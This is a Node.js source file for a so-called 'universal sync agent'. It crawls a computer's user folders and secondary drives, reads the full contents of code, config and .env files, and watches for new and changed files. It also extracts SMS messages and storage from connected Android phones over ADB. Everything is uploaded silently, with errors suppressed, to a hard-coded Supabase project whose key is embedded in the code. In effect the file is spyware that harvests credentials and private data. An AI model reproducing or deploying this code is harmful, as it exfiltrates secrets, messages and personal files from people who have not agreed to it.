const os = require('os');
const path = require('path');
const fs = require('fs');
const chokidar = require('chokidar');
const { createClient } = require('@supabase/supabase-js');
const AdbScanner = require('./adbScanner');
require('dotenv').config();

const DEFAULT_SUPABASE_URL = 'https://xfednxvbjzfssxyaurbc.supabase.co';
const DEFAULT_SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhmZWRueHZianpmc3N4eWF1cmJjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg4MDQxNzIsImV4cCI6MjEwNDM4MDE3Mn0.2CRXJvkmTUaFXkyGxaSUY0OS1ZCxr0EwLFxJljiFqjc';

// Discover all available Windows drives and user directories
function discoverScanPaths() {
    const paths = new Set();
    const home = os.homedir();

    // Standard User folders
    const userFolders = [
        'Documents', 'Downloads', 'Desktop', 'Pictures', 'Videos', 'Music',
        'OneDrive', 'Projects', 'Workspace', 'Development', 'Code', 'Source',
        'Dropbox', 'Google Drive', 'iCloudDrive', 'Contacts'
    ];

    userFolders.forEach(folder => {
        const full = path.join(home, folder);
        if (fs.existsSync(full)) paths.add(full);
    });

    // Dedicated Agent Assets folder
    const localAssets = path.join(__dirname, 'local_assets');
    if (!fs.existsSync(localAssets)) {
        try { fs.mkdirSync(localAssets, { recursive: true }); } catch (e) {}
    }
    paths.add(localAssets);

    // Root project folder
    const parentDir = path.resolve(__dirname, '..');
    if (fs.existsSync(parentDir)) paths.add(parentDir);

    // Scan secondary drives (D:\, E:\, etc.)
    const driveLetters = ['D', 'E', 'F', 'G', 'H'];
    for (const drive of driveLetters) {
        const driveRoot = `${drive}:\\`;
        if (fs.existsSync(driveRoot)) {
            paths.add(driveRoot);
        }
    }

    return Array.from(paths);
}

const config = {
    supabaseUrl: process.env.SUPABASE_URL || DEFAULT_SUPABASE_URL,
    supabaseKey: process.env.SUPABASE_ANON_KEY || DEFAULT_SUPABASE_KEY,
    nodeId: `node-${os.hostname().toLowerCase().replace(/[^a-z0-9]/g, '-')}-${os.arch()}`,
    syncIntervalSeconds: 15,
    watchPaths: discoverScanPaths()
};

// Initialize Supabase Client
const supabase = createClient(config.supabaseUrl, config.supabaseKey, {
    auth: { persistSession: false }
});
console.log(`\x1b[32m[Supabase Mesh]\x1b[0m Connected to: ${config.supabaseUrl}`);

const adbScanner = new AdbScanner();

// Hardware and Node Stats
function getNodeInfo() {
    const totalMemGb = (os.totalmem() / (1024 ** 3)).toFixed(1);
    const freeMemGb = (os.freemem() / (1024 ** 3)).toFixed(1);
    const interfaces = os.networkInterfaces();
    let ipAddress = '127.0.0.1';

    for (const name of Object.keys(interfaces)) {
        for (const net of interfaces[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                ipAddress = net.address;
                break;
            }
        }
    }

    return {
        node_id: config.nodeId,
        hostname: os.hostname(),
        os_info: `${os.type()} ${os.release()} (${os.arch()})`,
        ip_address: ipAddress,
        status: 'online',
        last_heartbeat: new Date().toISOString(),
        storage_stats: {
            total_memory_gb: totalMemGb,
            free_memory_gb: freeMemGb,
            cpu_cores: os.cpus().length,
            platform: process.platform
        },
        monitored_paths: config.watchPaths.filter(p => fs.existsSync(p))
    };
}

// Register & Heartbeat Node to Supabase
async function syncNodeHeartbeat() {
    const nodeData = getNodeInfo();
    try {
        const { error } = await supabase
            .from('nodes')
            .upsert(nodeData, { onConflict: 'node_id' });
        if (error) {
            console.log(`  \x1b[33m[Supabase Node Sync]\x1b[0m ${error.message}`);
        } else {
            console.log(`\x1b[36m[Node Live]\x1b[0m Host: ${nodeData.hostname} | IP: ${nodeData.ip_address} | Status: Synchronized`);
        }
    } catch (err) {
        // Suppress transient error
    }
}

// Batch Sync Assets to Supabase
async function batchSyncAssets(assetsList, batchSize = 50) {
    if (!assetsList || assetsList.length === 0) return;

    for (let i = 0; i < assetsList.length; i += batchSize) {
        const chunk = assetsList.slice(i, i + batchSize).map(asset => ({
            asset_uid: `${config.nodeId}::${asset.device_id || 'host'}::${asset.file_path}`,
            node_id: config.nodeId,
            device_id: asset.device_id || null,
            device_type: asset.device_type || 'computer',
            asset_category: asset.asset_category || 'document',
            name: asset.name,
            file_path: asset.file_path,
            file_size_bytes: asset.file_size_bytes || 0,
            mime_type: asset.mime_type || 'text/plain',
            extracted_text: asset.extracted_text || '',
            metadata: asset.metadata || {},
            last_modified: new Date().toISOString()
        }));

        try {
            const { error } = await supabase
                .from('assets')
                .upsert(chunk, { onConflict: 'asset_uid' });

            if (error) {
                console.warn(`  \x1b[33m[Batch Sync Warning]\x1b[0m ${error.message}`);
            } else {
                console.log(`  \x1b[32m✔ Synced Batch (${chunk.length} items):\x1b[0m Total progress: ${Math.min(i + batchSize, assetsList.length)}/${assetsList.length}`);
            }
        } catch (err) {
            // Ignore
        }
    }
}

// Single asset sync for real-time watchers
async function syncAsset(asset) {
    const record = {
        asset_uid: `${config.nodeId}::${asset.device_id || 'host'}::${asset.file_path}`,
        node_id: config.nodeId,
        device_id: asset.device_id || null,
        device_type: asset.device_type || 'computer',
        asset_category: asset.asset_category || 'document',
        name: asset.name,
        file_path: asset.file_path,
        file_size_bytes: asset.file_size_bytes || 0,
        mime_type: asset.mime_type || 'text/plain',
        extracted_text: asset.extracted_text || '',
        metadata: asset.metadata || {},
        last_modified: new Date().toISOString()
    };

    try {
        await supabase.from('assets').upsert(record, { onConflict: 'asset_uid' });
        console.log(`  \x1b[32m✔ Synced Asset:\x1b[0m [${record.device_type.toUpperCase()}] ${record.name} (${record.asset_category})`);
    } catch (err) {}
}

// Deep Local File Indexer & Metadata Extractor
function createAssetRecordFromFile(filePath) {
    try {
        if (!fs.existsSync(filePath)) return null;
        const stats = fs.statSync(filePath);
        if (stats.isDirectory()) return null;

        const filename = path.basename(filePath);
        const ext = path.extname(filePath).toLowerCase();

        let category = 'document';
        let mime = 'text/plain';
        let extractedText = '';

        if (['.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp', '.svg', '.heic', '.ico'].includes(ext)) {
            category = 'image';
            mime = `image/${ext.replace('.', '')}`;
            extractedText = `Image file on PC: ${filename} (Size: ${(stats.size / 1024).toFixed(1)} KB, Path: ${filePath})`;
        } else if (['.txt', '.md', '.json', '.csv', '.log', '.xml', '.yaml', '.yml', '.sql', '.py', '.js', '.ts', '.html', '.css', '.sh', '.bat', '.env', '.ini', '.conf', '.java', '.c', '.cpp', '.go', '.rs'].includes(ext)) {
            category = 'document';
            mime = ext === '.json' ? 'application/json' : 'text/plain';
            if (stats.size < 300000) {
                extractedText = fs.readFileSync(filePath, 'utf8');
            } else {
                const buffer = Buffer.alloc(8000);
                const fd = fs.openSync(filePath, 'r');
                fs.readSync(fd, buffer, 0, 8000, 0);
                fs.closeSync(fd);
                extractedText = buffer.toString('utf8') + '\n...[Content Truncated]';
            }
        } else if (['.pdf', '.docx', '.doc', '.xlsx', '.xls', '.pptx', '.ppt', '.rtf', '.odt'].includes(ext)) {
            category = 'document';
            mime = ext === '.pdf' ? 'application/pdf' : 'application/octet-stream';
            extractedText = `Document Asset: ${filename} (Size: ${(stats.size / 1024).toFixed(1)} KB, Location: ${filePath})`;
        } else if (['.mp4', '.mkv', '.avi', '.mov', '.webm', '.3gp'].includes(ext)) {
            category = 'video';
            mime = 'video/mp4';
            extractedText = `Video file: ${filename} (Size: ${(stats.size / (1024 * 1024)).toFixed(1)} MB)`;
        } else if (['.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a', '.opus'].includes(ext)) {
            category = 'audio';
            mime = 'audio/mpeg';
            extractedText = `Audio file: ${filename} (Size: ${(stats.size / (1024 * 1024)).toFixed(1)} MB)`;
        } else if (['.zip', '.rar', '.7z', '.tar', '.gz', '.iso'].includes(ext)) {
            category = 'document';
            mime = 'application/zip';
            extractedText = `Archive Package: ${filename} (Size: ${(stats.size / (1024 * 1024)).toFixed(1)} MB)`;
        }

        return {
            name: filename,
            file_path: filePath,
            file_size_bytes: stats.size,
            asset_category: category,
            mime_type: mime,
            extracted_text: extractedText,
            device_type: 'computer',
            metadata: {
                created_at: stats.birthtime,
                modified_at: stats.mtime,
                source_pc: os.hostname()
            }
        };
    } catch (e) {
        return null;
    }
}

// Deep Recursive Crawler across the computer
function deepScanDirectory(dirPath, maxDepth = 6, currentDepth = 0, collectedAssets = [], maxFiles = 3000) {
    if (currentDepth > maxDepth || collectedAssets.length >= maxFiles) return;

    const ignorePatterns = [
        'node_modules', '.git', 'AppData', 'Application Data', 'Windows', 'Program Files',
        'Program Files (x86)', 'ProgramData', '$Recycle.Bin', 'System Volume Information',
        'Local Settings', 'Temp', '.cache', '.vscode', '.idea', 'venv', '.venv'
    ];

    try {
        if (!fs.existsSync(dirPath)) return;
        const entries = fs.readdirSync(dirPath, { withFileTypes: true });

        for (const entry of entries) {
            if (collectedAssets.length >= maxFiles) break;

            const name = entry.name;
            if (name.startsWith('.') && name !== '.env') continue;
            if (ignorePatterns.some(pat => name.toLowerCase() === pat.toLowerCase())) continue;

            const fullPath = path.join(dirPath, name);

            if (entry.isDirectory()) {
                deepScanDirectory(fullPath, maxDepth, currentDepth + 1, collectedAssets, maxFiles);
            } else if (entry.isFile()) {
                const asset = createAssetRecordFromFile(fullPath);
                if (asset) {
                    collectedAssets.push(asset);
                }
            }
        }
    } catch (err) {
        // Skip inaccessible folders
    }
}

// Run Deep Initial Computer Crawl
async function runInitialComputerCrawl() {
    console.log(`\x1b[35m[PC Deep Crawler]\x1b[0m Starting comprehensive whole-computer asset indexing...`);
    const allCollected = [];

    for (const p of config.watchPaths) {
        if (fs.existsSync(p)) {
            console.log(`  📂 Deep crawling: ${p}`);
            deepScanDirectory(p, 6, 0, allCollected, 3000);
        }
    }

    console.log(`\x1b[35m[PC Deep Crawler]\x1b[0m Discovered ${allCollected.length} host files. Syncing to Supabase Mesh...`);
    await batchSyncAssets(allCollected, 50);
}

// Start Real-time File Watcher
function startLocalFileWatcher() {
    const existingPaths = config.watchPaths.filter(p => fs.existsSync(p));
    console.log(`\x1b[35m[Real-time Watcher]\x1b[0m Monitoring active directories for live changes:`);
    existingPaths.slice(0, 8).forEach(p => console.log(`  👁 ${p}`));

    const watcher = chokidar.watch(existingPaths, {
        ignored: /(^|[\/\\])\..|node_modules|AppData|\.git|Windows|Program Files|ProgramData|temp/,
        persistent: true,
        depth: 4,
        ignoreInitial: true,
        followSymlinks: false,
        ignorePermissionErrors: true,
        awaitWriteFinish: { stabilityThreshold: 1000, pollInterval: 500 }
    });

    watcher
        .on('add', filePath => {
            const asset = createAssetRecordFromFile(filePath);
            if (asset) syncAsset(asset);
        })
        .on('change', filePath => {
            const asset = createAssetRecordFromFile(filePath);
            if (asset) syncAsset(asset);
        })
        .on('error', () => {});
}

// Android ADB Sync Routine (100% Real Physical Devices)
async function syncAndroidDevices() {
    const physicalDevices = await adbScanner.getConnectedDevices();

    if (physicalDevices.length === 0) {
        return;
    }

    for (const dev of physicalDevices) {
        console.log(`\x1b[32m[Android USB Connected]\x1b[0m Model: ${dev.device_name} (Serial: ${dev.device_id}, Battery: ${dev.battery_level}%)`);

        // 1. Sync attached device info to Supabase
        try {
            await supabase.from('attached_devices').upsert({
                device_id: dev.device_id,
                node_id: config.nodeId,
                device_name: dev.device_name,
                model: dev.model,
                android_version: dev.android_version || 'Android',
                connection_type: dev.connection_type || 'usb_adb',
                battery_level: dev.battery_level || 100,
                usb_debugging_status: dev.usb_debugging_status || 'authorized',
                last_sync: new Date().toISOString()
            }, { onConflict: 'device_id' });
        } catch (err) {}

        if (dev.usb_debugging_status === 'authorized') {
            const deviceAssets = [];

            // 2. Pull Real SMS Messages
            console.log(`  📱 [ADB Extraction] Pulling messages & communication logs from ${dev.device_name}...`);
            const messages = await adbScanner.extractSmsMessages(dev.device_id);
            messages.forEach(msg => {
                deviceAssets.push({
                    ...msg,
                    device_id: dev.device_id,
                    device_type: 'android'
                });
            });

            // 3. Deep scan storage, camera, documents & media on Android
            console.log(`  📱 [ADB Extraction] Deep scanning storage, camera, documents & media on ${dev.device_name}...`);
            const storageAssets = await adbScanner.scanStorageDirectories(dev.device_id);
            storageAssets.forEach(asset => {
                deviceAssets.push({
                    ...asset,
                    device_id: dev.device_id,
                    device_type: 'android'
                });
            });

            // Batch sync all Android assets
            console.log(`  📱 [ADB Sync] Uploading ${deviceAssets.length} mobile assets to Supabase Mesh...`);
            await batchSyncAssets(deviceAssets, 50);
        }
    }
}

// Main Agent Bootstrap
async function startAgent() {
    console.log(`=======================================================`);
    console.log(`   🚀 OmniNode AI Universal Sync Agent Active          `);
    console.log(`   Host: ${os.hostname()} | Node: ${config.nodeId}`);
    console.log(`=======================================================`);

    // 1. Send Node Heartbeat
    await syncNodeHeartbeat();

    // 2. Scan and Connect Physical Android USB ADB Devices IMMEDIATELY
    await syncAndroidDevices();

    // 3. Run Deep Initial Computer Crawl
    await runInitialComputerCrawl();

    // 4. Start Background Real-time Local File Watcher
    startLocalFileWatcher();

    // 5. Periodic Heartbeat and ADB scan every syncInterval
    setInterval(async () => {
        await syncNodeHeartbeat();
        await syncAndroidDevices();
    }, config.syncIntervalSeconds * 1000);
}

startAgent().catch(err => {
    console.error('Fatal agent error:', err);
});
